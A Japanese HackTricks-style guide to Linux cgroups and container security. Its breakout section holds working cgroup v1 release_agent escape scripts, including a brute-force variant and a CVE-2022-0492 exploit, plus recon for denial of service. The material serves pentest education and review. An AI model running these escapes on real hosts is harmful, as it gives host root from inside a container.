# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## 概要

Linux の **control groups** は、accounting、制限、優先順位付け、policy enforcement のためにプロセスをまとめてグループ化するカーネルの仕組みです。namespaces が主にリソースの見え方を隔離するためのものであるのに対し、cgroups は主にプロセスの集合がそれらのリソースを**どれだけ**消費できるか、場合によっては**どのリソースクラス**とやり取りできるかを管理します。ユーザーが直接確認することがなくても、containers は常に cgroups に依存しています。これは、ほぼすべての modern runtime がカーネルに「これらのプロセスはこの workload に属し、これらが適用される resource rules である」と伝える方法を必要とするためです。

そのため container engines は、新しい container を独自の cgroup subtree に配置します。プロセスツリーがそこに入ると、runtime は memory に上限を設定し、PID 数を制限し、CPU usage に重み付けし、I/O を制御し、device access を制限できます。production environment では、これは multi-tenant safety と基本的な operational hygiene の両方に不可欠です。意味のある resource controls がない container は、memory を使い果たしたり、process を大量に生成して system を圧迫したり、CPU や I/O を独占したりして、host や neighboring workloads を不安定にする可能性があります。

security の観点では、cgroups は2つの別々の点で重要です。第一に、不適切または欠落した resource limits は、単純な denial-of-service attacks を可能にします。第二に、一部の cgroup features、特に古い **cgroup v1** setups では、container 内から writable だった場合に、強力な breakout primitives が歴史的に生み出されてきました。

## v1 Vs v2

現在広く使われている cgroup models には、大きく2種類あります。**cgroup v1** は複数の controller hierarchies を公開しており、古い exploit writeups では、そこで利用可能だった奇妙で、ときに過度に強力な semantics が中心となることがよくあります。**cgroup v2** は、より unified な hierarchy と、一般的によりクリーンな behavior を導入します。modern distributions は cgroup v2 をますます優先するようになっていますが、mixed または legacy environments も依然として存在するため、実際の systems を review する際には現在も両方の models が重要です。

この違いが重要なのは、**`release_agent`** の abuse など、最も有名な container breakout の事例の一部が、古い cgroup behavior と非常に密接に結び付いているためです。blog で cgroup exploit を見つけ、それを modern な cgroup v2-only system に何も考えず適用する読者は、target 上で実際に可能なことを誤解する可能性があります。

## Inspection

現在の shell がどこにあるかを確認する最も簡単な方法は次のとおりです。
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` ファイルには、現在のプロセスに関連付けられた cgroup パスが表示されます。最新の cgroup v2 host では、通常 unified entry が表示されます。古い host や hybrid host では、複数の v1 controller paths が表示される場合があります。パスが分かれば、`/sys/fs/cgroup` 以下の対応するファイルを調べて、limits と現在の使用量を確認できます。

cgroup v2 host では、次のコマンドが役立ちます:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
これらのファイルから、どの controllers が存在し、どの controllers が子 cgroup に委譲されているかが分かります。この委譲モデルは、rootless および systemd 管理環境で重要です。ランタイムが制御できる cgroup 機能は、親階層が実際に委譲しているサブセットに限られる場合があるためです。

## Lab

実際に cgroups を確認する方法の 1 つは、メモリ制限付きのコンテナを実行することです。
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
PID 制限付きの container も試せます：
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
これらの例が有用なのは、runtime flagをkernel file interfaceに結び付けるのに役立つためです。runtimeは魔法によってルールを強制しているのではありません。関連するcgroup settingsを書き込み、その後kernelにprocess treeに対してそれらを強制させています。

## Runtime Usage

Docker、Podman、containerd、CRI-Oは、すべて通常のoperationの一部としてcgroupsに依存しています。違いは通常、cgroupsを使用するかどうかではなく、**どのdefaultsを選択するか**、**systemdとどのように連携するか**、**rootless delegationがどのように機能するか**、そして**configurationのどの程度がengine levelで制御され、どの程度がorchestration levelで制御されるか**にあります。

Kubernetesでは、resource requestsとlimitsは最終的にnode上のcgroup configurationになります。Pod YAMLからkernel enforcementまでの経路はkubelet、CRI runtime、OCI runtimeを経由しますが、最終的にruleを適用するkernel mechanismは依然としてcgroupsです。Incus/LXC environmentsでもcgroupsは広く使用されています。特にsystem containersは、より豊富なprocess treeと、よりVMに近いoperational expectationsを公開することが多いためです。

## Misconfigurations And Breakouts

典型的なcgroup securityの話は、書き込み可能な **cgroup v1 `release_agent`** mechanismです。このmodelでは、attackerが適切なcgroup filesにwriteし、`notify_on_release`を有効化し、`release_agent`に保存されるpathを制御できる場合、cgroupが空になったときにkernelがhostのinitial namespaces内でattackerが選択したpathを実行する可能性があります。そのため、古いwriteupsではcgroup controller writability、mount options、namespace/capability conditionsに大きな注意が向けられています。

`release_agent`が利用できない場合でも、cgroupのmistakesは依然として重要です。過度に広いdevice accessにより、host devicesがcontainerから到達可能になることがあります。memoryとPID limitsが欠落していると、単純なcode executionがhost DoSに発展する可能性があります。rootless scenariosにおける弱いcgroup delegationも、runtimeが実際にはrestrictionを適用できなかったにもかかわらず、restrictionが存在するとdefendersに誤認させることがあります。

### `release_agent` Background

`release_agent` techniqueは **cgroup v1** にのみ適用されます。基本的な考え方は、cgroup内の最後のprocessがexitし、`notify_on_release=1`が設定されている場合、kernelが`release_agent`に保存されたpathのprogramを実行するというものです。このexecutionは **hostのinitial namespaces** 内で行われます。これにより、書き込み可能な`release_agent`がcontainer escape primitiveになります。

このtechniqueを機能させるには、通常、attackerは以下を必要とします。

- 書き込み可能な **cgroup v1** hierarchy
- child cgroupを作成または使用する能力
- `notify_on_release`を設定する能力
- `release_agent`にpathを書き込む能力
- hostの観点からexecutableとして解決されるpath

### Classic PoC

歴史的なone-liner PoCは次のとおりです。
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
この PoC は、`release_agent` に payload のパスを書き込み、cgroup の release をトリガーしてから、host 上で生成された出力ファイルを読み取ります。

### 読みやすい手順

同じ考え方を手順に分けると、より簡単に理解できます。

1. 書き込み可能な cgroup を作成して準備する:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. コンテナファイルシステムに対応するホストパスを特定する：
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. ホストパスから確認できる payload を配置する:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. cgroupを空にして実行をトリガーする:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
効果として、payload はホスト側でホストの root 権限により実行されます。実際の exploit では、payload は通常、証明ファイルを書き込むか、reverse shell を起動するか、ホストの状態を変更します。

### `/proc/<pid>/root` を使用する相対パス Variant

一部の環境では、container filesystem へのホストパスが明らかでないか、storage driver によって隠されています。その場合、payload のパスは `/proc/<pid>/root/...` を介して表現できます。ここで `<pid>` は、現在の container 内のプロセスに属するホスト PID です。これが相対パス brute-force variant の基盤となります。
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
ここで重要な trick は brute force 自体ではなく、path の形式です。`/proc/<pid>/root/...` を使うと、直接の host storage path が事前に分かっていない場合でも、kernel は host namespace から container filesystem 内の file を解決できます。

### CVE-2022-0492 Variant

2022 年、CVE-2022-0492 により、cgroup v1 の `release_agent` への書き込み時に、**initial** user namespace における `CAP_SYS_ADMIN` の適切なチェックが行われていないことが明らかになりました。これにより、脆弱な kernel ではこの technique を利用できる可能性が大幅に高まりました。cgroup hierarchy を mount できる container process は、host user namespace ですでに privileged でなくても `release_agent` に書き込めたためです。

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
脆弱な kernel では、host が host の root 権限で `/proc/self/exe` を実行します。

実際の悪用を行うには、まず環境に書き込み可能な cgroup-v1 のパスや危険なデバイスアクセスが残っているか確認します。
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
`release_agent` が存在し、書き込み可能であれば、すでに legacy-breakout の領域に入っています:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
cgroup path自体でescapeが成立しない場合、次に実用的な用途となるのは、多くの場合、denial of serviceまたはreconnaissanceです。
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
これらのコマンドを使うと、workload に fork-bomb を実行したり、メモリを積極的に消費したり、書き込み可能な legacy cgroup interface を悪用したりする余地があるかどうかをすぐに確認できます。

## Checks

target を確認する際、cgroup checks の目的は、どの cgroup model が使用されているか、container から書き込み可能な controller paths が見えるか、さらに `release_agent` などの古い breakout primitives がそもそも関係するかどうかを把握することです。
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
ここで興味深い点：

- `mount | grep cgroup` が **cgroup v1** を示す場合、古い breakout writeup の関連性が高くなります。
- `release_agent` が存在し、到達可能な場合、直ちに詳しく調査する価値があります。
- 表示されている cgroup hierarchy が writable で、container に強い capabilities もある場合、その環境はより注意深く review する必要があります。

**cgroup v1**、writable な controller mounts、さらに強い capabilities または弱い seccomp/AppArmor protection を持つ container が確認された場合、その組み合わせには慎重な注意が必要です。cgroups は退屈な resource-management の話として扱われることが多いものの、過去には最も示唆に富む container escape chain の一部となってきました。これはまさに、「resource control」と「host influence」の境界が、一般に想定されていたほど明確ではなかったためです。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | デフォルトで Enabled | Containers は自動的に cgroups に配置されます。resource limits は flags で設定しない限り optional です | `--memory`、`--pids-limit`、`--cpus`、`--blkio-weight` の省略；`--device`；`--privileged` |
| Podman | デフォルトで Enabled | `--cgroups=enabled` がデフォルトです。cgroup namespace のデフォルトは cgroup version によって異なります（cgroup v2 では `private`、一部の cgroup v1 setup では `host`） | `--cgroups=disabled`、`--cgroupns=host`、relaxed な device access、`--privileged` |
| Kubernetes | デフォルトで runtime 経由で Enabled | Pods と containers は node runtime によって cgroups に配置されます。fine-grained な resource control は `resources.requests` / `resources.limits` に依存します | resource requests/limits の省略、privileged な device access、host-level runtime misconfiguration |
| containerd / CRI-O | デフォルトで Enabled | cgroups は通常の lifecycle management の一部です | device controls を緩和する直接的な runtime configs、または legacy の writable cgroup v1 interfaces の公開 |

重要な違いは、**cgroup の存在**は通常デフォルトである一方、**実用的な resource constraints** は明示的に設定しない限り optional であることです。
{{#include ../../../../banners/hacktricks-training.md}}
